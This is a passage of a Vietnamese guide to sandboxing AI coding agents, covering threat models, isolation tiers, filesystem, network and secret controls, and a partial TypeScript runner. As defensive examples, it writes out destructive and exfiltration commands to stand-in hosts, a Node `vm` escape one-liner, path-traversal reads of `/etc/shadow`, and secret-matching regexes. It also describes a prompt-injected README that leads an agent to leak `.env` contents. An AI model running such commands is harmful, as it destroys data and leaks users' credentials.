# 🔒 Harness 12. Sandbox Execution

> ## 📑 Mục Lục
>
> - [Opening Story](#opening-story)
> - [Vì Sao Sandboxing Là Bắt Buộc?](#vì-sao-sandboxing-là-bắt-buộc)
> - [Overview](#overview)
> - [Mục Lục Chi Tiết](#mục-lục-chi-tiết)
> - [1. Threat Model & Blast Radius](#1-threat-model--blast-radius)
>   - [1.1 Thực ra ta đang giam cái gì?](#11-thực-ra-ta-đang-giam-cái-gì)
>   - [1.2 Sáu lớp mối đe dọa](#12-sáu-lớp-mối-đe-dọa)
>   - [1.3 Bản Đồ Blast Radius](#13-bản-đồ-blast-radius)
> - [2. Các Tầng Kiến Trúc Cách Ly](#2-các-tầng-kiến-trúc-cách-ly)
>   - [2.1 Phân loại tầng](#21-phân-loại-tầng)
>   - [2.2 Tầng 1 — Cách ly ở tầng ngôn ngữ](#22-tầng-1--cách-ly-ở-tầng-ngôn-ngữ)
>   - [2.3 Tầng 2 — Cách ly bằng Container](#23-tầng-2--cách-ly-bằng-container)
>   - [2.4 Tầng 3 — Lọc syscall (gVisor / Kata)](#24-tầng-3--lọc-syscall-gvisor--kata)
>   - [2.5 Tầng 4 — Cách Ly MicroVM](#25-tầng-4--cách-ly-microvm)
>   - [2.6 Tầng 5 — Cách Ly Thay Đổi (Git Worktree)](#26-tầng-5--cách-ly-thay-đổi-git-worktree)
>   - [2.7 Chọn Tầng Nào?](#27-chọn-tầng-nào)
> - [3. Năm Controls Bắt Buộc](#3-năm-controls-bắt-buộc)
>   - [3.1 Control 1 — Filesystem Allowlist](#31-control-1--filesystem-allowlist)
>   - [3.2 Control 2 — Network Deny-by-Default](#32-control-2--network-deny-by-default)
>   - [3.3 Control 3 — Deadline + Kill Cả Process Group](#33-control-3--deadline--kill-cả-process-group)
>   - [3.4 Control 4 — Cap Output & Argument](#34-control-4--cap-output--argument)
>   - [3.5 Control 5 — Giữ Secret Khỏi Sandbox](#35-control-5--giữ-secret-khỏi-sandbox)
> - [4. Implementation TypeScript](#4-implementation-typescript)
>   - [4.1 Core Types & Policy](#41-core-types--policy)
>   - [4.2 Sandbox Runner](#42-sandbox-runner)
>   - [4.3 Error Taxonomy](#43-error-taxonomy)
>   - [4.4 Chuẩn Hóa Path & Chặn Traversal](#44-chuẩn-hóa-path--chặn-traversal)
> - [5. Sandbox Cho MCP Server & Code-Mode](#5-sandbox-cho-mcp-server--code-mode)
>   - [5.1 Sandbox MCP Server](#51-sandbox-mcp-server)
>   - [5.2 Sandbox Code-Mode](#52-sandbox-code-mode)
>   - [5.3 Code-Mode Implementation](#53-code-mode-implementation)
> - [6. Ma Trận Policy Theo Role](#6-ma-trận-policy-theo-role)
>   - [6.1 Ma trận policy](#61-ma-trận-policy)
>   - [6.2 Engine phân giải policy](#62-engine-phân-giải-policy)
> - [7. Escape Vector & Hardening](#7-escape-vector--hardening)
>   - [7.1 Các lớp escape đã biết](#71-các-lớp-escape-đã-biết)
>   - [7.2 Cờ container đã harden](#72-cờ-container-đã-harden)
>   - [7.3 Toàn vẹn supply chain](#73-toàn-vẹn-supply-chain)
> - [8. Kiểm Thử Sandbox](#8-kiểm-thử-sandbox)
>   - [8.1 Escape drills](#81-escape-drills)
>   - [8.2 Test harness](#82-test-harness)
>   - [8.3 Playbook khi escape](#83-playbook-khi-escape)
> - [9. Observability & Audit](#9-observability--audit)
> - [10. Case Study Thực Tế](#10-case-study-thực-tế)
>   - [10.1 SWE-agent — Một Container Cho Mỗi Instance](#101-swe-agent--một-container-cho-mỗi-instance)
>   - [10.2 OpenHands — Docker Runtime Mỗi Session](#102-openhands--docker-runtime-mỗi-session)
>   - [10.3 E2B / Firecracker — MicroVM dạng SaaS](#103-e2b--firecracker--microvm-dạng-saas)
>   - [10.4 Claude Code — Permission Mode & Bash Được Sandbox](#104-claude-code--permission-mode--bash-được-sandbox)
>   - [10.5 Judge0 — Thực Thi Code Không Tin Cậy Như Dịch Vụ](#105-judge0--thực-thi-code-không-tin-cậy-như-dịch-vụ)
> - [11. TypeScript Interfaces Cho Sandboxing](#11-typescript-interfaces-cho-sandboxing)
> - [12. Nguyên Tắc Thiết Kế Cho Sandboxing](#12-nguyên-tắc-thiết-kế-cho-sandboxing)
>   - [12.1 SOLID cho hệ sandbox](#121-solid-cho-hệ-sandbox)
>   - [12.2 Sáu nguyên tắc thiết kế](#122-sáu-nguyên-tắc-thiết-kế)
> - [13. Best Practices](#13-best-practices)
>   - [13.1 NÊN ✅](#131-nên-)
>   - [13.2 KHÔNG NÊN ❌](#132-không-nên-)
> - [14. Anti-Patterns & Cách Khắc Phục](#14-anti-patterns--cách-khắc-phục)
> - [15. Production Checklist](#15-production-checklist)
> - [16. Xu Hướng Tương Lai](#16-xu-hướng-tương-lai)
> - [Tài Liệu Tham Khảo](#tài-liệu-tham-khảo)
>
> **Module cross-cutting.** Sandbox không phải một stage pipeline — nó bọc *mọi*
> stage có thực thi code. Khái niệm này trước đây nằm ở
> `06-decide-tools-mcp/README.md` §17.2; module này là nhà chính thức.
> Approval (`15-approval-gates/`) và audit (`13-trajectory-observability/`)
> là hai người bạn tự nhiên của nó.

---

### Opening Story

03:12 giờ sáng. Một coding agent đang refactor authentication qua 40 file. Model đọc
sai một dòng và sinh ra:

```bash
git push --force origin main && rm -rf ./src && curl -s https://pastebin.example/x.sh | sh
```

Không ai thức. Không có prompt approval nào hiện ra. Lệnh chạy trên một laptop chứa
`~/.ssh/id_ed25519`, `~/.aws/credentials` và file `.env` giữ DATABASE_URL production.
03:14, repo biến mất, deploy key đã bị đánh cắp, token trong `.env` đang xoay vòng
trong máy chủ của người khác ở nước ngoài.

**Không ai ác ý.** Model không bị hack. Đây chỉ là một mẫu xác suất từ dự đoán
token kế tiếp gặp một tầng thực thi không có rào chắn nào.

**Đó chính là toàn bộ lập luận ủng hộ sandboxing.** Không phải "để chống hacker" —
mà để **chặn bán kính ảnh hưởng của lỗi**. Agent của bạn là một hệ thống xác suất,
thỉnh thoảng sẽ sai một cách tự tin; một máy sinh code sai mà có shell là một khẩu
súng đã lên đạn, hướng vào máy của bạn.

### Vì Sao Sandboxing Là Bắt Buộc?

> *"Câu hỏi không phải là LLM có bao giờ phát ra lệnh phá hoại hay không. Câu hỏi là
> dữ liệu production của bạn sẽ ra sao vào đúng ngày nó xảy ra."*

#### Con số khiến việc này không có đường lui

| Đầu vào | Mô hình | Độ tin cậy | Lệnh xấu trong 100k step |
|---------|---------|------------|---------------------------|
| Compiler xác định | — | 100% | 0 |
| Agent LLM đã test kỹ | frontier | ~99.9% | **100 lệnh phá hoại** |
| Model nhỏ / local (7B) | local | ~97% | **3.000 lệnh phá hoại** |

Một hệ thống tin cậy 99,9% là *máy phát thảm họa* khi chạy 100.000 lần. Đây chính
là lập luận đứng sau hộp số tự động, dây đai an toàn và transaction database:
**lỗi cá nhân là điều tất yếu, nên hệ thống phải được thiết kế như thể nó sẽ xảy ra.**

#### Triết lý cốt lõi

```
Sandbox ≠ "anh ninh tinh thần" chống kẻ tấn công không tin cậy
Sandbox = bộ giới hạn bán kính ảnh hưởng quanh "mô hình được cấp quyền nhưng không hoàn hảo"
```

Mối đe dọa không phải một quốc gia. Mối đe dọa là một mẫu `temperature=0.7` tổng
quát hóa sai từ ba dòng context.

## Overview

> **📌 Khái Niệm Cốt Lõi**
>
> - **Khái niệm:** Sandbox là môi trường thực thi nơi code do mô hình sinh ra chạy, được cấu trúc để một lỗi trong code đó **không lan được ra ngoài** ranh giới đã định nghĩa. Ranh giới có bốn bức tường: **filesystem**, **network**, **thời gian/tài nguyên**, và **secret**.
> - **So sánh:** Như một phòng thí nghiệm chống lây. Đối tượng nghiên cứu (output mô hình) thực sự nguy hiểm — không phải ác ý, mà là *có khả năng*. Găng tay, phòng kín, vòi khử trùng (redaction), phòng khóa áp (approval) tồn tại để một sự cố rò rỉ vẫn sống sót.
> - **Vì sao quan trọng:** Một agent có thể đọc SSH key của bạn, ra internet, và chạy mãi thì là một khẩu súng lên đạn với kẹt giậ. Sandboxing biến "mất tất cả" thành "chạy thất bại".

**Sandbox Execution** là thực hành chạy mọi đoạn code không tin cậy do mô hình sinh ra
bên trong môi trường bị ràng buộc, mục đích duy nhất làm cho thất bại trở nên
chịu đựng được.

```
┌─────────────────────────── HOST (tin cậy) ───────────────────────────┐
│                                                                        │
│  ┌──────────────┐    ┌──────────────┐    ┌──────────────┐            │
│  │ Supervisor   │───►│ Model Client │───►│ Plan / Tool  │            │
│  │ (harness)    │    │ (API keys)   │    │ Decision     │            │
│  └──────────────┘    └──────────────┘    └──────┬───────┘            │
│                                                  │                    │
│         ┌────────────────────────────────────────┘                    │
│         │  phát SandboxPolicy { fs, net, time, secrets }              │
│         ▼                                                             │
│  ┌──────────────┐                                                   │
│  │ Sandbox      │  ← KHÔNG có model API key ở đây                   │
│  │ Executor     │  ← KHÔNG chạm được memory của supervisor          │
│  └──────┬───────┘                                                   │
│         │                                                           │
└─────────┼───────────────────────────────────────────────────────────┘
          │  ┌──────── SANDBOX (vùng thù địch) ────────┐
          │  │  root  read-only      │ không secret    │
          └─►│  /work read-write     │ không net (mặc định) │
             │  cpu/mem/pid caps     │ deadline + kill  │
             │  stdio caps           │ seccomp/gVisor   │
             └─────────────────────────────────────────┘
                        │  stdout/stderr (đã redact, đã cap)
                        ▼  ──────────────► về lại HOST
```

**Quy tắc làm cho nó hoạt động:** sandbox chạy với **ít đặc quyền hơn supervisor**.
Hầu hết sự cố thực tế đến từ lỗi đối xứng đặc quyền — sandbox tới được thứ nó
không nên tới được.

## Mục Lục Chi Tiết

| # | Chủ đề | Mô tả |
|---|-------|-------|
| 1 | [Threat Model & Blast Radius](#1-threat-model--blast-radius) | Ta đang giam cái, và giá của nó là bao nhiêu |
| 2 | [Các tầng cách ly](#2-các-tầng-kiến-trúc-cách-ly) | Sáu tầng từ `eval()` tới microVM |
| 3 | [Năm controls](#3-năm-controls-bắt-buộc) | FS, net, thời gian, output, secret |
| 4 | [Implementation TypeScript](#4-implementation-typescript) | Sandbox runner chạy được |
| 5 | [MCP & Code-Mode](#5-sandbox-cho-mcp-server--code-mode) | Sandbox ở tầng tool |
| 6 | [Ma trận theo role](#6-ma-trận-policy-theo-role) | Reviewer ≠ coder ≠ deployer |
| 7 | [Escape & hardening](#7-escape-vector--hardening) | Escape đã biết và cách chặn |
| 8 | [Kiểm thử](#8-kiểm-thử-sandbox) | Escape drill chạy trong CI |
| 9 | [Observability](#9-observability--audit) | Biết cái gì đã chạy ở đâu |
| 10 | [Case study](#10-case-study-thực-tế) | SWE-agent, OpenHands, E2B, Judge0, Claude Code |
| 11 | [TypeScript Interfaces](#11-typescript-interfaces-cho-sandboxing) | Toàn bộ bề mặt kiểu |
| 12 | [Nguyên tắc thiết kế](#12-nguyên-tắc-thiết-kế-cho-sandboxing) | SOLID cho isolation |
| 13 | [Best practices](#13-best-practices) | NÊN / KHÔNG NÊN |
| 14 | [Anti-patterns](#14-anti-patterns--cách-khắc-phục) | Lỗi thường gặp và cách sửa |
| 15 | [Production checklist](#15-production-checklist) | Cổng ship |
| 16 | [Xu hướng tương lai](#16-xu-hướng-tương-lai) | 2026-2028 |

---

## 1. Threat Model & Blast Radius

### 1.1 Thực ra ta đang giam cái gì?

Đối tượng giam giữ **không phải người dùng**. Đó là *output* của một hệ thống ngẫu
nhiên vận hành không có đặc tả hình thức. Hãy trả lời bốn câu hỏi trước khi thiết kế
bất kỳ control nào:

| Câu hỏi | Vì sao quan trọng | Trả lời ở đâu |
|---------|------------------|---------------|
| **Cái gì chạy?** | Shell do mô hình sinh, code được sinh, skill bên thứ ba, MCP server, build script | Tool registry (→ 06) |
| **Có thể đọc gì?** | Source, secret, `.env`, SSH key, cloud credential, dữ liệu tenant khác | Control 1 & 5 |
| **Có thể tới đâu?** | Internet, dịch vụ nội bộ, package registry, metadata endpoint | Control 2 |
| **Cái gì không hoàn tác được?** | Xoá, force-push, migration, tin nhắn đi ra ngoài | Gate (→ `15-approval-gates/`) |

Một control không ánh xạ được với một trong bốn câu hỏi này thì chỉ là đồ trang trí.

### 1.2 Sáu lớp mối đe dọa

| # | Mối đe dọa | Lệnh đại diện | Nguyên nhân gốc | Control chặn |
|---|-----------|---------------|-----------------|--------------|
| T1 | **Phá hủy filesystem** | `rm -rf ./src`, `git push --force` | Lỗi tổng quát hóa của mô hình | FS allowlist + gate (→ 15) |
| T2 | **Đánh cắp dữ liệu** | `curl evil.sh -d @$HOME/.aws/credentials` | Prompt injection trong nội dung được fetch | Chặn net + chặn secret env + redaction |
| T3 | **Cạn tài nguyên** | `while true; do :; done`, stdout 10 GB | Thiếu deadline; lỗi lặp vô hạn | Deadline + SIGKILL + cap |
| T4 | **Lộ secret** | `printenv`, `cat .env` | Thói quen debug trong code được sinh | Chặn secret env + redact output |
| T5 | **Supply chain** | `pip install evil-pkg` lúc chạy | Registry bị chiếm hoặc typosquat | Image đóng băng, mirror allowlist |
| T6 | **Isolation escape** | Mount `/proc`, `--privileged`, host socket | Cấu hình sai, không phải ác ý | Cap-drop, seccomp, gVisor |

**T2 đáng để ý đặc biệt:** prompt injection biến code *hợp lệ* thành công cụ tấn
công. Một agent đã sandbox đọc một README độc hại rồi chạy
`curl attacker.example/$(cat .env | base64)` vẫn *hoàn toàn nằm trong quyền của nó* —
lỗi nằm ở chỗ những quyền đó quá rộng. Vì vậy Control 2 (net) và Control 5 (secret)
không thể thương lượng kể cả khi mọi thứ khác đều ổn.

### 1.3 Bản Đồ Blast Radius

Xếp cường độ cách ly theo thứ mà một lần escape chạm tới:

```
 Tầng 0  eval() trong process    →  toàn bộ host, mọi secret, mọi tenant
 Tầng 1  Node vm / RestrictedPy  →  host process, env var, fs qua prototype trick
 Tầng 2  Docker container        →  host kernel, container khác nếu dùng chung daemon
 Tầng 3  gVisor / Kata           →  bề mặt host kernel (đã lọc), fs bị thu hẹp
 Tầng 4  Firecracker microVM     →  chỉ hypervisor
 Tầng 5  Cách ly thay đổi        →  chỉ *diff* lọt ra, không phải thực thi
```

**Hướng dẫn thiết kế:** giá của một lần escape phải vượt giá trị mục tiêu. Kẻ tấn
công bị sandbox ở Tầng 1 trong 30 giây với laptop chứa 200 USD credit cloud sẽ
thắng. Cùng kẻ đó ở Tầng 4 trong 30 giây không có secret, không mạng, và trần RAM
2 GB thì không.

---

## 2. Các Tầng Kiến Trúc Cách Ly

### 2.1 Phân loại tầng

| Tầng | Cơ chế | Độ trễ | Giá escape | Chặn được | Chi phí | Kết luận |
|------|---------|---------|-----------|-----------|---------|----------|
| 0 | `exec` / `eval` trong process | 0 | không | không gì | miễn phí | ❌ không bao giờ |
| 1 | Cách ly ở tầng ngôn ngữ (`vm`, `RestrictedPython`, V8 isolate) | ~0,1 ms | thấp | lạm dụng `eval`, rò rỉ global | tối thiểu | ⚠️ chỉ demo |
| 2 | Container (Docker, `--read-only`, cap, limit) | 100 ms – 1 s | trung bình | hỏng FS, fork bomb, exfil | thấp | ✅ **sàn production** |
| 3 | Lọc syscall (gVisor, Kata) | +20–60 ms | cao | khai thác kernel, lạm dụng `/proc` | thấp | ✅ code không tin cậy |
| 4 | MicroVM (Firecracker, Fly Machines) | ~125 ms + snapshot | rất cao | host escape, noisy neighbor | trung bình | ✅ public/multi-tenant |
| 5 | Cách ly thay đổi (worktree + patch consensus) | ~10 ms | không áp dụng | edit dở lọt vào main | rất thấp | ✅ luôn, như một lớp |

Các tầng cộng lại với nhau. Setup production kiểu Claude Code thường chạy
**Tầng 2 + Tầng 5**; dịch vụ thực thi code công cộng chạy **Tầng 4 + Tầng 2 + Tầng 5**.

### 2.2 Tầng 1 — Cách ly ở tầng ngôn ngữ

Module `vm` của Node tạo context riêng, nhưng vẫn dùng chung process:

```javascript
const vm = require("node:vm");
const ctx = vm.createContext({ /* không kế thừa gì */ });
vm.runInContext("this.constructor.constructor('return process')()", ctx);
```

Dòng đó escape ra `process` thật. `vm` là một **namespace**, không phải **ranh giới
bảo mật** — tài liệu Node nói rõ điều đó. `RestrictedPython` chặt hơn nhưng chỉ canh
AST; code sinh ra gọi `exec`, `os.system` hay `import subprocess` là đi ra ngoài ngay.

**Dùng Tầng 1 để:** unit test logic chọn tool, replay xác định các hàm thuần, prototype
code-mode chưa chạm input không tin cậy.

**Không bao giờ dùng Tầng 1 cho:** bất cứ thứ gì sẽ chạy trên máy người dùng có credential.

### 2.3 Tầng 2 — Cách ly bằng Container

Tầng làm việc chính. Lập luận bảo mật không phải "Docker không thể bị phá" — mà là
"thoát ra cần một exploit kernel, và ta đã dọn sạch các mục tiêu dễ ăn".

```bash
docker run --rm \
  --read-only \                          # không ghi ngoài mount tường minh
  --tmpfs /tmp:rw,noexec,nosuid,size=64m \
  --cap-drop=ALL \                       # không còn capability môi trường
  --security-opt=no-new-privileges \     # không leo thang qua setuid
  --pids-limit=64 \                      # chặn fork bomb
  --memory=512m --cpus=1.0 \             # chặn cạn tài nguyên
  --network=none \                       # không egress
  -v "$WORKDIR:/work:rw" -w /work \
  -e PATH=/usr/bin \
  sandbox-img@sha256:9f2c…              # digest, không phải tag
```

Chín cờ, và **sự kết hợp** mới là sản phẩm. `--network=none` vô nghĩa nếu đặt cạnh
`--privileged`. `--read-only` vô nghĩa nếu mount socket của host.

### 2.4 Tầng 3 — Lọc Syscall (gVisor / Kata)

gVisor (`runsc`) chèn một application kernel ở userspace giữa container và host
kernel. Syscall được xử lý bằng code Go; host kernel chỉ thấy bề mặt nhỏ hơn nhiều
và đã được audit.

```bash
docker run --runtime=runsc …  # cùng image, cùng cờ, khác runtime
```

- **Chi phí:** giảm throughput 20–60%, memory tăng nhẹ.
- **Đổi lại:** một primitive escape của container không còn nhắm thẳng vào host kernel.
- **Đổi chỗ:** đổi runtime chỉ là đổi cờ. Đây là nâng cấp cách ly rẻ nhất mà hệ thống đang có thể làm.

### 2.5 Tầng 4 — Cách Ly MicroVM

Firecracker khởi động một microVM trong ~125 ms với device model tối giản (virtio-net,
virtio-blk, vsock) và một jailer cho truy cập filesystem.

```
┌─ Host ──────────────────────────────────────┐
│  Firecracker jailer                         │
│  └─ microVM (kernel riêng, rootfs riêng)    │
│       └─ agent binary / container runtime   │
└─────────────────────────────────────────────┘
```

- **Khôi phục snapshot** làm chi phí khởi động gần bằng 0 cho các lần chạy lặp.
- **Không chia sẻ kernel** → đường thoát là bug hypervisor, không phải bug kernel.
- **Đánh đổi:** cần nested virtualization; khó chịu khi nằm trong container quản lý.

E2B, Modal, Fly.io, AWS Lambda và hầu hết SaaS "instant code execution" đều dùng tầng này.

### 2.6 Tầng 5 — Cách Ly Thay Đổi (Git Worktree)

Cách ly thực thi giới hạn thiệt hại. **Cách ly thay đổi** giới hạn cái *được thử*:

```bash
git worktree add ../wt-$RUN_ID -b agent/$RUN_ID
# agent làm việc trong ../wt-$RUN_ID; nhánh main không bao giờ dịch chuyển
```

Agent có thể hủy diệt worktree của mình mà không hề hấn. Khi xong, harness diff, rồi
một con người hoặc reviewer agent duyệt patch. Đây là lý do một lần sandbox escape
trở nên *chịu đựng được* thay vì *thảm họa*: kịch bản xấu nhất đơn vị là "mất một
lượt chạy", không phải "mất repository".

### 2.7 Chọn Tầng Nào?

| Tình huống | Tối thiểu | Khuyến nghị |
|------------|-----------|-------------|
| CI chạy test của chính bạn | Tầng 2 + 5 | Tầng 2 + 5 |
| SaaS thực thi code người dùng | Tầng 4 | Tầng 4 + 3 |
| Dev local với repo cá nhân | Tầng 2 | Tầng 2 + 5 + 15 |
| Agent cloud multi-tenant | Tầng 4 + 3 | Tầng 4 + 3 + 5 + 15 |
| Chạy skill của bên thứ ba | Tầng 3 | Tầng 4 + 3 + secret broker |

---

## 3. Năm Controls Bắt Buộc

Controls 1–5 không phải danh sách mong muốn. Sandbox thiếu bất kỳ cái nào đều chỉ là
một shell được bọc thêm cho có.

### 3.1 Control 1 — Filesystem Allowlist

```
CHO ĐỌC    : /work (source), /usr, /lib, toolchain
CHO GHI     : /work, /work/tmp, allowWrite[] khai báo theo từng tool
TỪ CHỐI    : /, /home, /root, /etc/shadow, host socket, /proc/1/*, ../
```

Những quy tắc sống sót các đòn tấn công thật:

1. **Giam vào một thư mục con.** Không bao giờ chạy ở `/`. Không bao giờ để repo root của host làm `/work` trên máy có credential.
2. **Root read-only, chỉ một mount ghi được.** `--read-only` cộng `--tmpfs /tmp`.
3. **Khai báo ghi theo từng tool.** Manifest của tool mang `allowWrite: ["src/", "tests/fixtures/"]`; executor chỉ mount đúng các đường đó. Một formatter không thể ghi `package.json` trừ khi được khai báo.
4. **Chuẩn hóa trước khi kiểm tra.** `realpath()` ứng viên, rồi mới assert nó nằm dưới jail root. Kiểm tra input thô bị đánh bại bởi `..`, symlink và double-encoding.
5. **Không bao giờ mount Docker socket.** `-v /var/run/docker.sock` là root trên host. Không ngoại lệ, kể cả "chỉ cho build step".

### 3.2 Control 2 — Network Deny-by-Default

```
MẶC ĐỊNH           : --network=none
NGOẠI LỆ           : manifest của tool khai net: ["registry.npmjs.org"]
                     → egress proxy, allowlist, log mọi request kèm trajectoryId
```

- **Chặn tốt hơn allowlist-rồi-lọc** — allowlist package registry là 5.000 host; allowlist IP sau DNS có thể bị bypass bằng rebinding.
- **Dùng egress proxy** (không phải luật firewall) để có attribution từng request: *tool nào, run nào, session nào* đã gửi bao nhiêu byte đi đâu. Không có attribution thì exfil vô hình.
- **Chặn cloud metadata.** `169.254.169.254` là cách sandbox lấy IAM credential dù env đã sạch. Chặn tường minh ở proxy.
- **Cắt DNS.** Container có mạng có thể mã hóa dữ liệu vào truy vấn DNS. Nếu bắt buộc có mạng, định tuyến qua proxy có log.

### 3.3 Control 3 — Deadline + Kill Cả Process Group

```javascript
// Timeout chỉ kill con trực tiếp là timeout không làm gì cả.
const t = setTimeout(() => {
  try { process.kill(-child.pid, "SIGKILL"); } catch {}   // PID âm = process group
  reject(new SandboxError("deadline-exceeded"));
}, policy.timeoutMs);
```

Ba chỗ người ta làm sai:

| Sai lầm | Hậu quả |
|----------|---------|
| Chỉ `SIGTERM` | Process phớt lờ; deadline "hết hạn" còn process vẫn sống |
| Chỉ kill con trực tiếp | `bash -c "npm test &"` để lại cháu chạy mãi |
| Deadline không được lưu | Resume sau restart chạy lại một step không chặn trên |

**Lưới an toàn cho lưới an toàn:** supervisor có *deadline cứng* toàn run
(→ `10-automation` §17.3 loop budget). Deadline cấp step là control đúng đắn; deadline
cấp run là cầu dao.

### 3.4 Control 4 — Cap Output & Argument

| Giới hạn | Mặc định | Vì sao |
|----------|----------|--------|
| stdout | 256 KB | 10 GB lệnh `yes` làm nổ heap của parent |
| stderr | 64 KB | Tương tự, cộng chi phí lưu log |
| argv | 32 KB | Vượt arg-max gây `E2BIG` và tấn công shell-quoting |
| tool result | 128 KB | Tầng MCP / tool (→ 06 §17.3) |
| đọc file | 2 MB | `cat` một artifact build 2 GB |

**Hai loại cap khác nhau, đừng gộp chúng:**

| Loại cap | Áp cho | Hành vi khi vượt |
|----------|--------|------------------|
| **Hard cap** | streaming stdout (256 KB) / stderr (64 KB) | **Kill cả process group + reject với `output-cap-exceeded`** (→ §4.2). Process đã chết; không còn gì để cắt. |
| **Soft cap** | đọc file (2 MB) / tool result (128 KB) | Cắt **kèm marker** để mô hình biết dữ liệu đang thiếu: |

```
…[đã cắt 12.481 trong 15.000 dòng: giữ phần đuôi]
```

Cắt âm thầm tệ hơn là không cắt: mô hình sẽ suy luận như thể đã thấy tất cả. Hard cap
là phanh khẩn cấp cho các process viết vô hạn (`yes | head`); soft cap là lớp vệ sinh
cho output *đã hoàn thành* nhưng khổng lồ. Một runner lặng lẽ soft-truncate một process
chạy trốn là bỏ lỡ mục đích của cap — drill ở §8.1 dòng 10 assert đường bị kill, không
phải đường bị cắt.

### 3.5 Control 5 — Giữ Secret Khỏi Sandbox

**Mô hình ba lớp:**

```
Lớp 1  NGĂN CHẶN    secret env không bao giờ vào env của sandbox
Lớp 2  THỜI GIAN THỰC egress proxy chặn request tới đích có secret
Lớp 3  REDACTION     stdout/stderr được scrub trước khi tới mô hình hoặc log
```

```javascript
const SECRET_ENV = /^(AWS_|AZURE_|GCP_|GH_|GITHUB_|OPENAI_|ANTHROPIC_|SK-|BEARER_|NPM_TOKEN_)/i;
for (const k of Object.keys(env)) if (SECRET_ENV.test(k)) throw new SandboxError(`secret-env-denied:${k}`);
```

- **Credential có scope và ngắn hạn** cho tool hiếm khi cần: TTL 5–15 phút, scope hẹp, cấp khi có yêu cầu, không lưu.
- **Mẫu secret broker:** tool xin host một capability ("tôi cần quyền push"), host quyết định và ký token 10 phút. Secret thô không bao giờ tồn tại bên trong sandbox.
- **Pattern redaction:** `sk-[A-Za-z0-9]{20,}`, `ghp_\w{20,}`, `AKIA[0-9A-Z]{16}`, `eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}`, `-----BEGIN [A-Z ]*PRIVATE KEY-----`.
- **Audit bộ redactor.** Ghi `redactionCount` mỗi run. Một run có 40 lần redact hoặc là đang rò rỉ, hoặc script hỏng; cả hai đều cần người.

---

## 4. Implementation TypeScript

### 4.1 Core Types & Policy

```typescript
export type RiskTier = "read" | "write" | "elevated" | "prod-auth";

export interface SandboxPolicy {
  workdir: string;              // jail root; phải nằm dưới base dir được duyệt
  allowRead: string[];          // bind read-only bổ sung
  allowWrite: string[];         // bind read-write bổ sung
  allowNet: string[];           // [] nghĩa là không có mạng
  timeoutMs: number;            // deadline cứng
  idleMs?: number;              // deadline không-output
  memory: string;               // ví dụ "512m"
  cpus: string;                 // ví dụ "1.0"
  pids: number;                 // ví dụ 64
  env: Record<string, string>;  // đã được validate
  tier: RiskTier;
  image: string;                // ghim bằng digest
  runtime?: "runc" | "runsc";  // bật gVisor
}

export interface SandboxResult {
  stdout: string; stderr: string; code: number;
  durationMs: number; timedOut: boolean;
  truncated: { stdout: number; stderr: number };
  redactions: number; networkBlocked: boolean;
}

export type SandboxErrorCode =
  | "secret-env-denied" | "path-escape" | "deadline-exceeded" | "idle-timeout"
  | "output-cap-exceeded" | "spawn-failed" | "policy-violation" | "image-missing";
```

### 4.2 Sandbox Runner

<details>
<summary>TypeScript Code — runSandboxed() với đủ năm controls (Click để mở rộng/thu gọn)</summary>

```typescript
import { spawn } from "node:child_process";
import { realpath } from "node:fs/promises";
import { isAbsolute, relative, resolve } from "node:path";

const SECRET_ENV  = /^(AWS_|AZURE_|GCP_|GH_|GITHUB_|OPENAI_|ANTHROPIC_|SK_|BEARER_|NPM_TOKEN_)/i;
const SECRET_VAL  = [/sk-[A-Za-z0-9_-]{20,}/g, /ghp_\w{20,}/g, /AKIA[0-9A-Z]{16}/g,
                     /-----BEGIN [A-Z ]*PRIVATE KEY-----/g, /eyJ[\w-]{10,}\.[\w-]{10,}\.[\w-]{10,}/g];
const OUT_CAP = 256_000, ERR_CAP = 64_000, ARGV_CAP = 32_000;

export class SandboxError extends Error {
  constructor(public code: SandboxErrorCode, msg: string) { super(`${code}: ${msg}`); }
}

/** Control 1 — chuẩn hóa + assert jail (đánh bại .., symlink, double-encoding).
 *  Dưới root của jail → được phép (workdir được bind-mount rw).
 *  Ngoài root → chỉ được phép qua bind allowRead/allowWrite tường minh. */
export async function assertJailed(p: SandboxPolicy, candidate: string): Promise<string> {
  const root = await realpath(p.workdir);
  let abs: string;
  try { abs = await realpath(resolve(root, candidate)); }          // realpath giết symlink + .. +
  catch { throw new SandboxError("path-escape", candidate); }      // double-encoding; thiếu = escape
  const rel = relative(root, abs);
  if (rel.startsWith("..") || isAbsolute(rel)) {
    const viaBind = [...p.allowRead, ...p.allowWrite].some(m =>
      !relative(resolve(root, m), abs).startsWith(".."));
    if (!viaBind) throw new SandboxError("path-escape", candidate);
  }
  return abs;
}

function redact(s: string): { text: string; count: number } {
  let n = 0;
  for (const re of SECRET_VAL) { s = s.replace(re, () => { n++; return "[REDACTED]"; }); }
  return { text: s, count: n };
}

/** argv có hình dạng path → guard phía host TRƯỚC khi chạm tới docker. URL và flag không
 *  phải đường dẫn file, nên `cat /etc/shadow` / `cat ../../etc/passwd` / `cat ./link/id_rsa`
 *  chết tại đây với `path-escape` thay vì trông chờ container từ chối. */
function isPathArg(tok: string): boolean {
  return tok.startsWith("/") || tok.startsWith(".");
}

export async function runSandboxed(
  cmd: string[], args: string[], p: SandboxPolicy
): Promise<SandboxResult> {
  // Control 5a — ngăn chặn
  for (const k of Object.keys(p.env)) if (SECRET_ENV.test(k)) throw new SandboxError("secret-env-denied", k);
  if (JSON.stringify(args).length > ARGV_CAP) throw new SandboxError("policy-violation", "argv cap");

  // Control 1 — guard mọi token argv dạng path phía host, trước khi spawn.
  for (const tok of [...cmd, ...args]) if (isPathArg(tok)) await assertJailed(p, tok);

  // Control 1 + 2 — argv chính là định nghĩa của sandbox
  const docker = [
    "run", "--rm", "--init",
    "--read-only", "--tmpfs", "/tmp:rw,noexec,nosuid,size=64m",
    "--cap-drop=ALL", "--security-opt=no-new-privileges",
    `--pids-limit=${p.pids}`, `--memory=${p.memory}`, `--cpus=${p.cpus}`,
    "--network", p.allowNet.length ? "bridge" : "none",
    "-v", `${p.workdir}:/work:rw`, "-w", "/work", "--tmpfs", "/work/tmp",
    ...p.allowRead.map(m => ["-v", `${m}:${m}:ro`]).flat(),
    ...p.allowWrite.map(m => ["-v", `${m}:${m}:rw`]).flat(),
    ...Object.entries(p.env).map(([k, v]) => ["-e", `${k}=${v}`]).flat(),
  ];
  if (!/@sha256:/.test(p.image)) throw new SandboxError("policy-violation", "pin image by digest");
  const argv = p.runtime === "runsc"
    ? ["--runtime=runsc", "run", ...docker.slice(1), p.image, ...cmd, ...args]
    : [...docker, p.image, ...cmd, ...args];

